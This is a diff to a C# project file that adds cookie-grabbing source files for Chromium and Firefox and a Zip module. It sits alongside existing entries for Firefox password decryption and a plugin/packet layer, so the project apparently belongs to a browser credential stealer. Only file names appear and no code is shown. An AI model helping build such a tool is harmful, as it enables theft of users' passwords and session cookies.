@@ -56,7 +56,9 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Browsers\Chromium\ChromiumCookies.cs" />
     <Compile Include="Browsers\CredentialModel.cs" />
+    <Compile Include="Browsers\Firefox\Cookies\FFCookiesGrabber.cs" />
     <Compile Include="Browsers\Firefox\FFDecryptor.cs" />
     <Compile Include="Browsers\Firefox\Firefox.cs" />
     <Compile Include="Browsers\Firefox\FirefoxPassReader.cs" />
@@ -71,6 +73,7 @@
     <Compile Include="Packet.cs" />
     <Compile Include="Plugin.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Zip.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="packages.config" />
